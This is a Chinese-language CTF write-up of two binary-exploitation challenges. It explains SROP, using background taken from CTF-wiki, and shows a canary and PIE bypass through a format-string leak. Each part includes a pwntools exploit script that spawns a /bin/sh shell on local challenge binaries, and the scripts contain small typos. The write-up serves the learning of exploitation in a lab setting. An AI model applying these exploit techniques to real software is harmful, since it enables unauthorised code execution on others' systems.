比赛分析：这次比赛pwn方向题目不多，且十分经典，但也有许多新的知识还为学习，
本次就仅仅分析我没有做出来的题目

SROP

checksec发现没有NX，PIE，cananry保护

没有main函数，但有sys_read函数，可以进行漏洞利用，但没有后门函数
有bin/sh字符串，看是否可以进行ROP链进行构造

没有pop rdi ret无法进行使用系统调用，无果
本题重点考察SROP

+++

知识小课堂：参考https://xz.aliyun.com/news/12236
https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/

SROP：SROP全称为**(Sigreturn Oriented Programming)**，在ctfwiki中将其归类为了高级ROP，其中，sigreturn是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用，其实就是利用了linux中的系统调用号，利用linux下的15号系统调用号调用->rt_sigreturn
重点利用了signal的机制（软中断信号）signal机制

这里基础知识就搬运ctfwiki

signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：

  1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。
  2. 内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。

这一段内存也被称为Signal Frame

通俗一点讲解，其实就是
①保存上下文环境（即各种寄存器），接下来走到②执行信号处理函数，处理完后③恢复相关栈环境，④继续执行用户程序。而在恢复寄存器环境时没有去校验这个栈是不是合法的，如果我们能够控制栈，就能在恢复上下文环境这个环节直接设定相关寄存器的值。

漏洞利用

通过上面对面signal机制的认识，我们可以敏锐的发现，在1~2的过程中，此时我们保存的sigFrame是完全在用户空间的，也就是对于进程来说可读可写，而且其实SROP利用的最根本的漏洞是因为，在1的时候内核对于进程挂起后保存下的sigFrame以及恢复环境是的sigFrame是没有关联的，所以我们可以伪造sigFrame从而利用syscall进行调用恶意进程。

总结一下就是：

用于在内核在恢复上下文的时候并没有与保存的上下文做对比，同时内核在恢复上下文时是从构造的Signal Frame中pop出来各个寄存器的值，而此时的Signal Frame是在栈里的并且用户是可读可写的。这两点疏忽就导致了我们可以伪造Signal Frame之后主动执行sigreturn来控制每个寄存器的值。

+++

简单来说就是使用sigreturn系统号来恢复寄存器的值，可以直接使用pwntool中的工具，要可以控制rax(系统调用号，而read函数的返回值可以为rax写入字符的个数)
进行构造exp

from pwn from pwn import *
binsh=0x40203A
pop_rax=0x40104a
syscall=0x401045
context(os='linux', arch='amd64', log_level='debug')
p=process('./pwn01')

frame = SigreturnFrame()   		#使用frame的工具，改变各寄存器的值
frame.rax = 59 #execve函数的调用号，实际为59（64位下）
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload=b'a'*8+p64(pop_rax)+p64(0xf)+p64(syscall)+bytes(frame)	#先填入8个垃圾字节，0xf是sigreturn的调用号，
p.sendafter("now seems extraordinary.\n", payload)
p.interactive()

cananry保护绕过+PIE绕过+巧妙构造shell(Onegadget)

checksec

保护全开，放进IDA查看

有cananry保护，可以利用格式化字符串漏洞进行泄露
+++

有关cananry绕过看这篇文章：https://blog.csdn.net/RChaos/article/details/105147321
有关PIE绕过https://www.cnblogs.com/Junglezt/p/18253924

+++

注意：此处不能进行两次read进行泄露cananry，因为read函数的输入大小被控制，不能常规操作，只能使用格式化字符串泄露
泄露完之后又有问题，read函数大小限制，绕过PIE保护，这里我们采用泄露地址来绕过PIE
通过官方WP得知

图中endbr64处的地址为main函数，查ai得到启用 CET endbr64通常在main函数口中,因为main函数也被压入栈，返回地址
之后发现溢出的空间太小了，则再次跳回main进行循环

这里发现在sub_11e9函数结束后，栈顶为buf开始的值，则可以进行一次pop,使rdi为第一次的buf即binsh

from pwn from pwn import *
pop_rdi_sym=0x1245			#不是正确的地址，只是偏移
main_sym = 0x125b
ret_sym = 0x101a
p=process('./pwn03')

payload = "/bin/sh;#%p#%11$p#%16p" 	#加入binsh，为后面进行pop做准备，分别泄露binsh，cananry，main地址
p.sendafter(b'Pondering the past as I stand in the remnants of the setting sun.\n',payload)
p.recvuntil(b"#")
dist = p.recv().decode().split('#')
stack = int(dist[0],16)
canary = int(dist[1],16)
main = int(dist[2],16)


sym_base = main - main_sym		#绕过PIE，显示真实地址
pop_rdi = sym_base + pop_rdi_sym
ret = sym_base + ret_sym
call_system = main-8			#IDA中查看

payload = b'a'*8+p64(canary)+b'b'*8+p64(main+5)	#main+5是IDA中不算endbr64的第一个命令地址
p.send(payload)
payload = flat([stack,call_system])			#call_system使最后进行执行   
p.sendafter(b'Pondering the past as I stand in the remnants of the setting sun.\n',payload)
payload = b'a'*8+p64(canary)+b'a'*8+p64(pop_rdi)
p.send(payload)

p.interactive()
